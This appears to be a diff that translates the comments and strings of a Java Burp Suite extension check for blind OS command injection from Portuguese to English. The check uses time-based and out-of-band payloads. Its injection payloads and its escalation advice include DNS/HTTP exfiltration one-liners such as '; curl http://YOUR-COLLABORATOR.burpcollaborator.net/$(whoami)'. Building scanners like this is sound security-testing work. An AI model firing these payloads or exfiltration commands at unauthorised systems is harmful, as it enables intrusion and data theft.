@@ -13,65 +13,65 @@ import java.util.ArrayList;
 import java.util.List;
 
 /**
- * OS Command Injection — detecção BLIND baseada em tempo: injeta comandos
- * de "dormir" (sleep/timeout) em sintaxes de shell Unix e Windows, e compara
- * o tempo de resposta contra um baseline (mesma requisição sem o payload).
- * Um atraso consistente próximo ao tempo pedido no payload é forte indício
- * de que o comando está sendo executado no servidor.
+ * OS Command Injection — BLIND, time-based detection: injects "sleep" commands
+ * (sleep/timeout) using Unix and Windows shell syntax, and compares the response
+ * time against a baseline (the same request without the payload). A consistent
+ * delay close to the time requested in the payload is strong evidence that the
+ * command is being executed on the server.
  *
- * Pra reduzir falso-positivo, o teste só confirma o achado se o atraso bater
- * de novo numa SEGUNDA tentativa (evita flagar lentidão de rede pontual).
+ * To reduce false positives, the test only confirms the finding if the delay
+ * matches again on a SECOND attempt (avoids flagging a one-off network hiccup).
  *
- * Criado por Rx0 - @rodrigocoutinho91
+ * Created by Rx0 - @rodrigocoutinho91
  */
 public class OsCommandInjectionCheck implements VulnCheck {
 
     private static final String[] PARAM_NAMES = {"host", "ip", "domain", "cmd", "file", "name", "ping", "target"};
-    private static final int SEGUNDOS_SLEEP = 6;
+    private static final int SLEEP_SECONDS = 6;
 
     private static final String[] PAYLOADS = {
-            "; sleep " + SEGUNDOS_SLEEP,
-            "| sleep " + SEGUNDOS_SLEEP,
-            "`sleep " + SEGUNDOS_SLEEP + "`",
-            "$(sleep " + SEGUNDOS_SLEEP + ")",
-            "& timeout " + SEGUNDOS_SLEEP, // Windows cmd
-            "| ping -n " + (SEGUNDOS_SLEEP + 1) + " 127.0.0.1", // Windows (ping como delay)
+            "; sleep " + SLEEP_SECONDS,
+            "| sleep " + SLEEP_SECONDS,
+            "`sleep " + SLEEP_SECONDS + "`",
+            "$(sleep " + SLEEP_SECONDS + ")",
+            "& timeout " + SLEEP_SECONDS, // Windows cmd
+            "| ping -n " + (SLEEP_SECONDS + 1) + " 127.0.0.1", // Windows (ping as a delay)
     };
 
     @Override
-    public String nome() {
-        return "OS Command Injection (blind, baseado em tempo)";
+    public String name() {
+        return "OS Command Injection (blind, time-based)";
     }
 
     @Override
-    public List<Finding> executar(MontoyaApi api, String baseUrl) {
-        return executar(api, baseUrl, (ScanContext) null);
+    public List<Finding> execute(MontoyaApi api, String baseUrl) {
+        return execute(api, baseUrl, (ScanContext) null);
     }
 
     @Override
-    public List<Finding> executar(MontoyaApi api, String baseUrl, ScanContext ctx) {
-        List<Finding> achados = new ArrayList<>();
+    public List<Finding> execute(MontoyaApi api, String baseUrl, ScanContext ctx) {
+        List<Finding> findings = new ArrayList<>();
         String base = baseUrl.endsWith("/") ? baseUrl.substring(0, baseUrl.length() - 1) : baseUrl;
 
-        // --- Confirmação OOB via interactsh: comando que faz o servidor "ligar de volta" ---
-        if (ctx != null && ctx.interactsh() != null && ctx.interactsh().isDisponivel()) {
+        // --- OOB confirmation via interactsh: a command that makes the server "call back" ---
+        if (ctx != null && ctx.interactsh() != null && ctx.interactsh().isAvailable()) {
             for (String param : new String[]{"host", "cmd", "ip"}) {
                 try {
-                    String host = ctx.interactsh().criarProbe(
-                            "OS Command Injection confirmado via interação out-of-band no parâmetro '" + param + "'",
-                            Severity.CRITICA,
+                    String host = ctx.interactsh().createProbe(
+                            "OS Command Injection confirmed via out-of-band interaction in parameter '" + param + "'",
+                            Severity.CRITICAL,
                             base,
-                            "O comando injetado no parâmetro '" + param + "' fez o servidor resolver/contatar um domínio único " +
-                                    "de teste (via nslookup/curl embutido no payload) — confirmação inequívoca de execução de " +
-                                    "comando no sistema operacional do servidor, sem depender de medição de tempo.",
-                            "Nunca passe entrada do usuário para funções que executam comandos do SO. Use APIs nativas da " +
-                                    "linguagem em vez de shell, e se for inevitável, use allowlist rígida + escaping adequado.",
-                            "1) Reproduza com o payload exato: ; nslookup <host-gerado> (ou curl http://<host-gerado>/ em " +
-                                    "ambientes com curl disponível). 2) Uma vez confirmada a execução, escale pra extração de " +
-                                    "dados via DNS exfiltration: `; nslookup $(whoami).<host-gerado>` embute a saída do comando " +
-                                    "no próprio subdomínio consultado. 3) RCE confirmado — prioridade máxima.");
+                            "The command injected in parameter '" + param + "' made the server resolve/contact a unique " +
+                                    "test domain (via nslookup/curl embedded in the payload) — an unambiguous confirmation of " +
+                                    "OS command execution on the server, without relying on time measurement.",
+                            "Never pass user input into functions that execute OS commands. Use the language's native " +
+                                    "APIs instead of a shell, and if that's unavoidable, use a strict allowlist plus proper escaping.",
+                            "1) Reproduce with the exact payload: ; nslookup <generated-host> (or curl http://<generated-host>/ in " +
+                                    "environments where curl is available). 2) Once execution is confirmed, escalate to data " +
+                                    "exfiltration via DNS: `; nslookup $(whoami).<generated-host>` embeds the command output " +
+                                    "in the queried subdomain itself. 3) RCE confirmed — treat as top priority.");
                     if (host != null) {
-                        // Payload de DNS lookup (funciona tanto em shells Unix quanto via nslookup no Windows)
+                        // DNS lookup payload (works both in Unix shells and via nslookup on Windows)
                         String payloadUnix = "; nslookup " + host + " #";
                         String payloadWin = "& nslookup " + host + " & ";
                         for (String payload : new String[]{payloadUnix, payloadWin}) {
@@ -80,65 +80,65 @@ public class OsCommandInjectionCheck implements VulnCheck {
                         }
                     }
                 } catch (Exception e) {
-                    api.logging().logToError("[Rx0] Erro ao disparar probe OOB de OS Command Injection (param " + param + "): " + e.getMessage());
+                    api.logging().logToError("[Rx0] Error firing OS Command Injection OOB probe (param " + param + "): " + e.getMessage());
                 }
             }
         }
 
-        // Baseline: tempo normal de resposta sem nenhum payload
-        long tempoBaseline = medirTempo(api, base + "/");
-        if (tempoBaseline < 0) return achados;
+        // Baseline: normal response time with no payload
+        long baselineTime = measureTime(api, base + "/");
+        if (baselineTime < 0) return findings;
 
         for (String param : PARAM_NAMES) {
             for (String payload : PAYLOADS) {
                 try {
                     String url = base + "/?" + param + "=" + URLEncoder.encode(payload, "UTF-8");
-                    long tempo1 = medirTempo(api, url);
-                    if (tempo1 < 0) continue;
+                    long attempt1 = measureTime(api, url);
+                    if (attempt1 < 0) continue;
 
-                    long esperadoMs = SEGUNDOS_SLEEP * 1000L;
-                    boolean pareceuAtrasado = (tempo1 - tempoBaseline) >= (esperadoMs - 1500);
+                    long expectedMs = SLEEP_SECONDS * 1000L;
+                    boolean lookedDelayed = (attempt1 - baselineTime) >= (expectedMs - 1500);
 
-                    if (pareceuAtrasado) {
-                        // Confirma numa segunda tentativa pra reduzir falso-positivo por lentidão pontual de rede
-                        long tempo2 = medirTempo(api, url);
-                        boolean confirmado = tempo2 >= 0 && (tempo2 - tempoBaseline) >= (esperadoMs - 1500);
+                    if (lookedDelayed) {
+                        // Confirms on a second attempt to reduce false positives from a one-off network slowdown
+                        long attempt2 = measureTime(api, url);
+                        boolean confirmed = attempt2 >= 0 && (attempt2 - baselineTime) >= (expectedMs - 1500);
 
-                        if (confirmado) {
-                            achados.add(new Finding(
-                                    "Possível OS Command Injection (blind) no parâmetro '" + param + "'",
-                                    Severity.CRITICA,
+                        if (confirmed) {
+                            findings.add(new Finding(
+                                    "Possible OS Command Injection (blind) in parameter '" + param + "'",
+                                    Severity.CRITICAL,
                                     url,
-                                    "O envio de um payload com comando de delay (" + SEGUNDOS_SLEEP + "s) causou um atraso consistente " +
-                                            "na resposta em DUAS tentativas separadas, em comparação com o baseline sem payload. Isso é forte " +
-                                            "indício de que o valor do parâmetro é executado como comando de sistema operacional no servidor.",
-                                    "Payload: " + payload + " | Baseline: " + tempoBaseline + "ms | Tentativa 1: " + tempo1
-                                            + "ms | Tentativa 2 (confirmação): " + tempo2 + "ms",
-                                    "Nunca passe entrada do usuário para funções que executam comandos do SO (exec, system, popen...). " +
-                                            "Use APIs nativas da linguagem em vez de shell, e se for inevitável, use allowlist rígida + escaping adequado.",
-                                    "1) Como é blind (sem saída visível), confirme de novo manualmente no Repeater trocando o tempo de sleep " +
-                                            "(ex: de " + SEGUNDOS_SLEEP + " para 15s) e veja se o atraso escala proporcionalmente — isso descarta coincidência de rede. " +
-                                            "2) Para extrair dados sem canal de saída, use exfiltração via DNS/HTTP out-of-band: payload tipo " +
-                                            "`; curl http://SEU-COLLABORATOR.burpcollaborator.net/$(whoami)` usando o Burp Collaborator pra " +
-                                            "confirmar execução E capturar a saída do comando. 3) Isso é RCE completo — trate como achado de prioridade máxima."));
-                            break; // confirmado nesse param, não testa os outros payloads
+                                    "Sending a payload with a delay command (" + SLEEP_SECONDS + "s) caused a consistent delay " +
+                                            "in the response across TWO separate attempts, compared to the baseline with no payload. This is " +
+                                            "strong evidence that the parameter value is executed as an OS command on the server.",
+                                    "Payload: " + payload + " | Baseline: " + baselineTime + "ms | Attempt 1: " + attempt1
+                                            + "ms | Attempt 2 (confirmation): " + attempt2 + "ms",
+                                    "Never pass user input into functions that execute OS commands (exec, system, popen...). " +
+                                            "Use the language's native APIs instead of a shell, and if that's unavoidable, use a strict allowlist plus proper escaping.",
+                                    "1) Since this is blind (no visible output), manually reconfirm in Repeater by changing the sleep time " +
+                                            "(e.g. from " + SLEEP_SECONDS + " to 15s) and check whether the delay scales proportionally — this rules out a network coincidence. " +
+                                            "2) To extract data with no output channel, use DNS/HTTP out-of-band exfiltration: a payload like " +
+                                            "`; curl http://YOUR-COLLABORATOR.burpcollaborator.net/$(whoami)` using Burp Collaborator to " +
+                                            "confirm execution AND capture the command output. 3) This is full RCE — treat it as the highest-priority finding."));
+                            break; // confirmed on this param, no need to test the other payloads
                         }
                     }
                 } catch (Exception e) {
-                    api.logging().logToError("[Rx0] Erro no check de OS Command Injection (param " + param + "): " + e.getMessage());
+                    api.logging().logToError("[Rx0] Error in OS Command Injection check (param " + param + "): " + e.getMessage());
                 }
             }
         }
-        return achados;
+        return findings;
     }
 
-    private long medirTempo(MontoyaApi api, String url) {
+    private long measureTime(MontoyaApi api, String url) {
         try {
-            long inicio = System.currentTimeMillis();
+            long start = System.currentTimeMillis();
             HttpRequest req = HttpRequest.httpRequestFromUrl(url);
             HttpResponse resp = api.http().sendRequest(req).response();
             if (resp == null) return -1;
-            return System.currentTimeMillis() - inicio;
+            return System.currentTimeMillis() - start;
         } catch (Exception e) {
             return -1;
         }
